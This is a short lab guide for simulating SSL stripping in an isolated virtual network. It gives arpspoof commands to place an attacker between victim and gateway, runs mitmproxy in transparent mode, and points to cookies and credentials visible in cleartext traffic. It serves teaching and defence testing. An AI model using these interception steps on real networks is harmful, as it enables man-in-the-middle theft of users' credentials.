# Lab: SSL Stripping (HTTPS Downgrade) — Safe Simulation

## Objective
Simulate an HTTPS downgrade in a controlled lab to illustrate the risk and validate defenses.

## Requirements
- Attacker VM: Kali Linux / Parrot OS (or any Linux)  
- Victim VM: a browser-enabled VM (Ubuntu/Windows)  
- Target web server: Simple test site with both HTTP and HTTPS enabled (self-signed OK for lab)  
- Tools: `mitmproxy` (recommended) or `sslstrip` for historical demonstration, Wireshark/tcpdump

## Setup notes
- Use an isolated virtual network (VirtualBox internal network, VMware host-only, or lab VLAN).
- Do not run this on production or public networks.

## Steps (using mitmproxy for safer, modern lab)
1. Install `mitmproxy` on attacker:
   ```bash
   sudo apt update
   sudo apt install mitmproxy -y

2. Enable IP forwarding (if using ARP spoofing):
   echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

3. Position attacker as MITM (ARP spoofing with     arpspoof or use a network emulator). Example with arpspoof:
sudo arpspoof -i eth0 -t <victim-ip> <gateway-ip>
sudo arpspoof -i eth0 -t <gateway-ip> <victim-ip>

4. Start mitmproxy in transparent mode to observe and optionally modify traffic:
   sudo mitmproxy --mode transparent --showhost

5. From victim, visit http://testsite.local or follow an HTTP link that would normally upgrade to HTTPS.
   
6. Observe in mitmproxy that HTTPS responses proxied to the victim may be intercepted if site lacks HSTS or proper redirects. Look for cookie fields, form posts, or credentials in cleartext HTTP traffic.